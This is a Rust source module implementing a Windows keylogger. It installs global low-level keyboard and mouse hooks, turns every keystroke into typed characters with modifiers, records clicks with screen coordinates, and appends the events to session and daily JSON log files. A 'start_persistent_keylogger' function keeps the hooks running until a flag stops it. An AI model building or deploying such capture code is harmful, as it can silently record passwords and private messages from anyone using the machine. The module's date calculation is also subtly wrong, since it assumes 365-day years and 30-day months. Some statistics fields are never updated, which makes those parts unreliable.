#[cfg(windows)]
mod imp {
    use std::ptr::null_mut;
    use std::sync::{mpsc, Mutex, Once};
    use std::time::{SystemTime, UNIX_EPOCH};
    use std::fs::{File, OpenOptions};
    use std::io::{Write, BufReader, BufRead};
    use std::path::Path;
    use serde::{Serialize, Deserialize};

    use windows::Win32::Foundation::*;
    use windows::Win32::System::LibraryLoader::*;
    use windows::Win32::System::Threading::GetCurrentThreadId;
    use windows::Win32::UI::Input::KeyboardAndMouse::*;
    use windows::Win32::UI::WindowsAndMessaging::*;

    static INIT: Once = Once::new();
    use std::sync::OnceLock;
    
    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct InputEvent {
        pub timestamp: u64,
        pub event_type: String,    // "Key" or "Mouse"
        pub action: String,        // "Press", "Click", "Wheel", etc.
        pub key_or_button: String, // キー名またはボタン名
        pub coordinates: Option<(i32, i32)>, // マウス座標
        pub modifiers: Vec<String>, // 修飾キー
        pub window_title: Option<String>, // アクティブウィンドウ（将来用）
    }
    
    #[derive(Debug, Clone, Serialize, Deserialize)]
    pub struct InputStatistics {
        pub total_keystrokes: u32,
        pub total_mouse_clicks: u32,
        pub session_duration_ms: u32,
        pub most_used_keys: Vec<(String, u32)>,
        pub mouse_travel_distance: f64,
    }
    
    static LOG: OnceLock<Mutex<Vec<InputEvent>>> = OnceLock::new();
    static STATS: OnceLock<Mutex<InputStatistics>> = OnceLock::new();

    static mut KEY_HOOK: HHOOK = HHOOK(null_mut());
    static mut MOUSE_HOOK: HHOOK = HHOOK(null_mut());

    // 数値(VKコード) → 文字(フレンドリー名)
    const VK_TABLE: &[(u16, &str)] = &[
        (0x01, "LeftMouse"),(0x02, "RightMouse"),(0x03, "Cancel"),(0x04, "MiddleMouse"),
        (0x05, "X1Mouse"),(0x06, "X2Mouse"),
        (0x08, "Backspace"),(0x09, "Tab"),(0x0C, "Clear"),(0x0D, "Enter"),
        (0x10, "Shift"),(0x11, "Ctrl"),(0x12, "Alt"),(0x13, "Pause"),(0x14, "CapsLock"),
        (0x1B, "Esc"),(0x1C, "Convert"),(0x1D, "NonConvert"),(0x1E, "Accept"),(0x1F, "ModeChange"),
        (0x20, "Space"),(0x21, "PageUp"),(0x22, "PageDown"),(0x23, "End"),(0x24, "Home"),
        (0x25, "Left"),(0x26, "Up"),(0x27, "Right"),(0x28, "Down"),
        (0x29, "Select"),(0x2A, "Print"),(0x2B, "Execute"),(0x2C, "PrintScreen"),
        (0x2D, "Insert"),(0x2E, "Delete"),(0x2F, "Help"),
        (0x30, "0"),(0x31, "1"),(0x32, "2"),(0x33, "3"),(0x34, "4"),(0x35, "5"),(0x36, "6"),(0x37, "7"),(0x38, "8"),(0x39, "9"),
        (0x41, "A"),(0x42, "B"),(0x43, "C"),(0x44, "D"),(0x45, "E"),(0x46, "F"),(0x47, "G"),(0x48, "H"),(0x49, "I"),(0x4A, "J"),(0x4B, "K"),(0x4C, "L"),(0x4D, "M"),(0x4E, "N"),(0x4F, "O"),(0x50, "P"),(0x51, "Q"),(0x52, "R"),(0x53, "S"),(0x54, "T"),(0x55, "U"),(0x56, "V"),(0x57, "W"),(0x58, "X"),(0x59, "Y"),(0x5A, "Z"),
        (0x5B, "LeftWin"),(0x5C, "RightWin"),(0x5D, "Apps"),(0x5F, "Sleep"),
        (0x60, "Num0"),(0x61, "Num1"),(0x62, "Num2"),(0x63, "Num3"),(0x64, "Num4"),(0x65, "Num5"),(0x66, "Num6"),(0x67, "Num7"),(0x68, "Num8"),(0x69, "Num9"),
        (0x6A, "Multiply"),(0x6B, "Add"),(0x6C, "Separator"),(0x6D, "Subtract"),(0x6E, "Decimal"),(0x6F, "Divide"),
        (0x90, "NumLock"),(0x91, "ScrollLock"),
        (0xA0, "LShift"),(0xA1, "RShift"),(0xA2, "LCtrl"),(0xA3, "RCtrl"),(0xA4, "LAlt"),(0xA5, "RAlt"),
        (0xA6, "BrowserBack"),(0xA7, "BrowserForward"),(0xA8, "BrowserRefresh"),(0xA9, "BrowserStop"),
        (0xAA, "BrowserSearch"),(0xAB, "BrowserFavorites"),(0xAC, "BrowserHome"),
        (0xAD, "VolumeMute"),(0xAE, "VolumeDown"),(0xAF, "VolumeUp"),
        (0xB0, "MediaNext"),(0xB1, "MediaPrev"),(0xB2, "MediaStop"),(0xB3, "MediaPlayPause"),
        (0xB4, "LaunchMail"),(0xB5, "MediaSelect"),(0xB6, "LaunchApp1"),(0xB7, "LaunchApp2"),
        (0xBA, "OEM_1"),(0xBB, "OEM_PLUS"),(0xBC, "OEM_COMMA"),(0xBD, "OEM_MINUS"),(0xBE, "OEM_PERIOD"),(0xBF, "OEM_2"),(0xC0, "OEM_3"),(0xDB, "OEM_4"),(0xDC, "OEM_5"),(0xDD, "OEM_6"),(0xDE, "OEM_7"),(0xDF, "OEM_8"),(0xE2, "OEM_102"),
        (0xE5, "Process"),(0xE7, "Packet"),(0xF6, "Attn"),(0xF7, "CrSel"),(0xF8, "ExSel"),(0xF9, "ErEOF"),(0xFA, "Play"),(0xFB, "Zoom"),(0xFC, "NoName"),(0xFD, "PA1"),(0xFE, "Clear"),
    ];

    fn vk_table_lookup(vk: u32) -> Option<&'static str> {
        let code = vk as u16;
        for (k, v) in VK_TABLE.iter() {
            if *k == code { return Some(*v); }
        }
        None
    }

    fn is_modifier_vk(vk: u32) -> bool {
        vk == VK_SHIFT.0 as u32 || vk == VK_CONTROL.0 as u32 || vk == VK_MENU.0 as u32
    }

    unsafe fn modifier_strings() -> Vec<&'static str> {
        let mut mods = Vec::with_capacity(3);
        if (GetKeyState(VK_CONTROL.0 as i32) as u16 & 0x8000) != 0 { mods.push("Ctrl"); }
        if (GetKeyState(VK_MENU.0 as i32) as u16 & 0x8000) != 0 { mods.push("Alt"); }
        if (GetKeyState(VK_SHIFT.0 as i32) as u16 & 0x8000) != 0 { mods.push("Shift"); }
        mods
    }

    fn vk_friendly_name(vk: u32) -> Option<&'static str> {
        if let Some(name) = vk_table_lookup(vk) { return Some(name); }
        match vk as u16 {
            x if (VK_F1.0..=VK_F24.0).contains(&x) => None,
            _ => None,
        }
    }

    unsafe fn vk_to_readable(kbd: &KBDLLHOOKSTRUCT) -> String {
        let vk = kbd.vkCode;
        let mut name: Option<String> = None;
        if !is_modifier_vk(vk) {
            let mut key_state = [0u8; 256];
            if GetKeyboardState(&mut key_state).is_ok() {
                let hkl = GetKeyboardLayout(0);
                let mut buf = [0u16; 8];
                let res = ToUnicodeEx(vk, kbd.scanCode, &key_state, &mut buf, 0, Some(hkl));
                if res > 0 { name = Some(String::from_utf16_lossy(&buf[..res as usize])); }
            }
        }
        let display = if let Some(s) = name {
            s
        } else if let Some(n) = vk_friendly_name(vk) {
            n.to_string()
        } else if (VK_F1.0..=VK_F24.0).contains(&(vk as u16)) {
            let n = (vk as u16 - VK_F1.0) + 1;
            format!("F{}", n)
        } else {
            format!("VK({})", vk)
        };
        if !is_modifier_vk(vk) {
            let mods = modifier_strings();
            if !mods.is_empty() { format!("{}+{}", mods.join("+"), display) } else { display }
        } else { display }
    }

    fn current_timestamp() -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as u64
    }

    fn log_push(event: InputEvent) {
        INIT.call_once(|| { 
            let _ = LOG.set(Mutex::new(Vec::with_capacity(1024))); 
            let _ = STATS.set(Mutex::new(InputStatistics {
                total_keystrokes: 0,
                total_mouse_clicks: 0,
                session_duration_ms: 0,
                most_used_keys: Vec::new(),
                mouse_travel_distance: 0.0,
            }));
        });
        
        if let Some(m) = LOG.get() {
            if let Ok(mut g) = m.lock() { g.push(event.clone()); }
        }
        
        // 統計情報を更新
        if let Some(stats_mutex) = STATS.get() {
            if let Ok(mut stats) = stats_mutex.lock() {
                match event.event_type.as_str() {
                    "Key" => stats.total_keystrokes += 1,
                    "Mouse" => stats.total_mouse_clicks += 1,
                    _ => {}
                }
            }
        }
    }

    fn log_take() -> Vec<InputEvent> {
        if let Some(m) = LOG.get() {
            if let Ok(mut g) = m.lock() { return std::mem::take(&mut *g); }
        }
        Vec::new()
    }
    
    pub fn get_statistics() -> Option<InputStatistics> {
        if let Some(stats_mutex) = STATS.get() {
            if let Ok(stats) = stats_mutex.lock() {
                return Some(stats.clone());
            }
        }
        None
    }
    
    // 永続化機能
    const LOG_FILE: &str = "keylog_session.json";
    const DAILY_LOG_PREFIX: &str = "keylog_daily_";
    
    fn save_events_to_file(events: &[InputEvent], filename: &str) -> Result<(), Box<dyn std::error::Error>> {
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(filename)?;
            
        for event in events {
            let json_line = serde_json::to_string(event)?;
            writeln!(file, "{}", json_line)?;
        }
        file.flush()?;
        Ok(())
    }
    
    fn load_events_from_file(filename: &str) -> Vec<InputEvent> {
        if !Path::new(filename).exists() {
            return Vec::new();
        }
        
        let mut events = Vec::new();
        if let Ok(file) = File::open(filename) {
            let reader = BufReader::new(file);
            for line in reader.lines() {
                if let Ok(line_content) = line {
                    if let Ok(event) = serde_json::from_str::<InputEvent>(&line_content) {
                        events.push(event);
                    }
                }
            }
        }
        events
    }
    
    fn get_today_string() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        
        // 簡単な日付計算（UTC基準）
        let days_since_epoch = timestamp / 86400; // 秒/日
        let year = 1970 + (days_since_epoch / 365);
        let day_in_year = days_since_epoch % 365;
        let month = (day_in_year / 30) + 1;
        let day = (day_in_year % 30) + 1;
        
        format!("{:04}-{:02}-{:02}", year, month, day)
    }

    pub fn save_session_to_file() -> Result<(), Box<dyn std::error::Error>> {
        let events = log_take();
        if !events.is_empty() {
            save_events_to_file(&events, LOG_FILE)?;
            
            // 日次ログファイルにも保存
            let today = get_today_string();
            let daily_filename = format!("{}{}.json", DAILY_LOG_PREFIX, today);
            save_events_to_file(&events, &daily_filename)?;
        }
        Ok(())
    }
    
    pub fn load_session_from_file() -> Vec<InputEvent> {
        load_events_from_file(LOG_FILE)
    }
    
    pub fn get_daily_logs(date: &str) -> Vec<InputEvent> {
        let filename = format!("{}{}.json", DAILY_LOG_PREFIX, date);
        load_events_from_file(&filename)
    }

    pub unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        if n_code == HC_ACTION as i32 {
            let msg = w_param.0 as u32;
            if msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN {
                let kbd_struct = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
                let label = vk_to_readable(kbd_struct);
                let modifiers = modifier_strings().into_iter().map(|s| s.to_string()).collect();
                
                let event = InputEvent {
                    timestamp: current_timestamp(),
                    event_type: "Key".to_string(),
                    action: "Press".to_string(),
                    key_or_button: label,
                    coordinates: None,
                    modifiers,
                    window_title: None,
                };
                log_push(event);
            }
        }
        CallNextHookEx(Some(KEY_HOOK), n_code, w_param, l_param)
    }

    pub unsafe extern "system" fn mouse_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        if n_code == HC_ACTION as i32 {
            let ms = &*(l_param.0 as *const MSLLHOOKSTRUCT);
            let (x, y) = (ms.pt.x, ms.pt.y);
            
            let (action, button) = match w_param.0 as u32 {
                WM_LBUTTONDOWN => ("Click", "Left"),
                WM_RBUTTONDOWN => ("Click", "Right"),
                WM_MBUTTONDOWN => ("Click", "Middle"),
                WM_XBUTTONDOWN => {
                    let btn = ((ms.mouseData >> 16) & 0xFFFF) as u16;
                    let which = if btn == XBUTTON1 { "X1" } else if btn == XBUTTON2 { "X2" } else { "X?" };
                    ("Click", which)
                }
                WM_MOUSEWHEEL => {
                    let delta = ((ms.mouseData >> 16) & 0xFFFF) as i16;
                    let dir = if delta > 0 { "WheelUp" } else { "WheelDown" };
                    ("Wheel", dir)
                }
                WM_MOUSEHWHEEL => {
                    let delta = ((ms.mouseData >> 16) & 0xFFFF) as i16;
                    let dir = if delta > 0 { "WheelRight" } else { "WheelLeft" };
                    ("Wheel", dir)
                }
                _ => return CallNextHookEx(Some(MOUSE_HOOK), n_code, w_param, l_param),
            };
            
            let event = InputEvent {
                timestamp: current_timestamp(),
                event_type: "Mouse".to_string(),
                action: action.to_string(),
                key_or_button: button.to_string(),
                coordinates: Some((x, y)),
                modifiers: modifier_strings().into_iter().map(|s| s.to_string()).collect(),
                window_title: None,
            };
            log_push(event);
        }
        CallNextHookEx(Some(MOUSE_HOOK), n_code, w_param, l_param)
    }

    pub fn collect_input_events_for(duration_ms: u32) -> Vec<String> {
        unsafe {
            let (tx, rx) = mpsc::channel::<u32>();
            let th = std::thread::spawn(move || {
                let h_instance = GetModuleHandleW(None).unwrap_or_default();
                // Install hooks
                KEY_HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();
                MOUSE_HOOK = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();

                // Announce thread id
                let tid = GetCurrentThreadId();
                let _ = tx.send(tid);

                // Message loop
                let mut msg = MSG::default();
                while GetMessageW(&mut msg, Some(HWND(null_mut())), 0, 0).as_bool() {
                    // no-op
                }

                let _ = UnhookWindowsHookEx(KEY_HOOK);
                let _ = UnhookWindowsHookEx(MOUSE_HOOK);
            });

            // Timer thread to stop the loop after duration
            if let Ok(tid) = rx.recv() {
                std::thread::spawn(move || {
                    std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
                    let _ = PostThreadMessageW(tid, WM_QUIT, WPARAM(0), LPARAM(0));
                });
            }

            let _ = th.join();
            
            // セッション終了時に自動保存
            let _ = save_session_to_file();
            
            // 互換性のため、文字列形式でも返す
            log_take().into_iter().map(|event| {
                if let Some((x, y)) = event.coordinates {
                    format!("{}: {} {} ({}, {})", event.event_type, event.action, event.key_or_button, x, y)
                } else {
                    format!("{}: {}", event.event_type, event.key_or_button)
                }
            }).collect()
        }
    }
    
    // 新しい構造化されたイベントを返す関数
    pub fn collect_input_events_structured(duration_ms: u32) -> Vec<InputEvent> {
        // 既存関数を実行してから構造化されたデータを取得
        let _ = collect_input_events_for(duration_ms);
        load_session_from_file()
    }
    
    // 完全常時キーロガー（停止コマンドまで動作し続ける）  
    pub fn start_persistent_keylogger(running_flag: std::sync::Arc<std::sync::atomic::AtomicBool>) {
        use std::sync::atomic::Ordering;
        
        unsafe {
            let (tx, rx) = mpsc::channel::<u32>();
            let th = std::thread::spawn(move || {
                let h_instance = GetModuleHandleW(None).unwrap_or_default();
                
                // Install hooks
                KEY_HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();
                MOUSE_HOOK = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), Some(HINSTANCE(h_instance.0)), 0).unwrap_or_default();

                // Announce thread id
                let tid = GetCurrentThreadId();
                let _ = tx.send(tid);

                // 永続的なメッセージループ
                let mut msg = MSG::default();
                while running_flag.load(Ordering::Relaxed) {
                    // 通常のメッセージループ（ブロッキング）
                    if GetMessageW(&mut msg, Some(HWND(null_mut())), 0, 0).as_bool() {
                        if msg.message == WM_QUIT {
                            break;
                        }
                        // メッセージ処理は不要（フックで直接処理）
                    }
                    
                    // 強制終了チェック
                    if !running_flag.load(Ordering::Relaxed) {
                        break;
                    }
                }

                let _ = UnhookWindowsHookEx(KEY_HOOK);
                let _ = UnhookWindowsHookEx(MOUSE_HOOK);
            });

            let _ = rx.recv(); // スレッド開始を待機
            let _ = th.join();
        }
    }
}

#[cfg(windows)]
pub use imp::{
    collect_input_events_for, 
    collect_input_events_structured,
    save_session_to_file,
    load_session_from_file,
    get_daily_logs,
    get_statistics,
    start_persistent_keylogger,
    InputEvent,
    InputStatistics
};

#[cfg(not(windows))]
pub fn collect_input_events_for(_duration_ms: u32) -> Vec<String> { Vec::new() }

#[cfg(not(windows))]
pub fn collect_input_events_structured(_duration_ms: u32) -> Vec<InputEvent> { Vec::new() }

#[cfg(not(windows))]
pub fn save_session_to_file() -> Result<(), Box<dyn std::error::Error>> { Ok(()) }

#[cfg(not(windows))]
pub fn load_session_from_file() -> Vec<InputEvent> { Vec::new() }

#[cfg(not(windows))]
pub fn get_daily_logs(_date: &str) -> Vec<InputEvent> { Vec::new() }

#[cfg(not(windows))]
pub fn get_statistics() -> Option<InputStatistics> { None }

// 非Windows用のダミー構造体
#[cfg(not(windows))]
#[derive(Debug, Clone)]
pub struct InputEvent {
    pub timestamp: u64,
    pub event_type: String,
    pub action: String,
    pub key_or_button: String,
    pub coordinates: Option<(i32, i32)>,
    pub modifiers: Vec<String>,
    pub window_title: Option<String>,
}

#[cfg(not(windows))]
#[derive(Debug, Clone)]
pub struct InputStatistics {
    pub total_keystrokes: u32,
    pub total_mouse_clicks: u32,
    pub session_duration_ms: u32,
    pub most_used_keys: Vec<(String, u32)>,
    pub mouse_travel_distance: f64,
}